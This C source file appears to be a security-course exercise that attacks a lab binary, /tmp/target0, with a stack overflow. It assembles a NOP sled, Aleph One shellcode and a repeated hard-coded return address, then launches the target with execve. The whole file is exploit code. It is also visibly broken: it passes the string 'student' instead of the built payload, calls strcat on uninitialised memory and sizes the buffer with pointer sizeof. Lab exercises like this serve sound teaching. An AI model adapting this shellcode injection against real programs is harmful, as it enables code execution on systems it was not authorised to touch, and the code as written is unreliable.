#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"

int main(void)
{
  char *args[3]; 
  char *env[1];

  char *noop = "\x90";
  char *address = "\xf8\xf2\xff\xbf";
  int sled_length = 202;

  char *result = malloc(sizeof(noop)*sled_length + sizeof(shellcodeAlephOne) + sizeof(address)*38 + 1);
  char *result1 = repeat(noop, sled_length);
  strcat(result, result1);

  strcat(result, shellcodeAlephOne);

  char *result2 = repeat(address, 38);
  strcat(result, result2);
  args[0] = TARGET;
  args[1] = "student"; 
  args[2] = NULL;
  
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


